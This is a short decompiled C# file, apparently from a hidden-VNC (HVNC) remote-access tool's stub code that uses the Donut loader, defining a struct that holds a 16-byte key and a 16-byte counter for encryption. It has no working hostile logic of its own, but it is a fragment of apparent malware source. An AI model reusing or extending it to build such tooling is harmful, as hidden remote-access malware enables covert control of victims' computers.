using System.Runtime.InteropServices;

namespace BirdBrainmofo.HVNC.StubUtils.Donut.Structs
{
	// Token: 0x020000C2 RID: 194
	public struct DSCrypt
	{
		// Token: 0x040006AA RID: 1706
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public byte[] byte_0;

		// Token: 0x040006AB RID: 1707
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public byte[] ctr;
	}
}
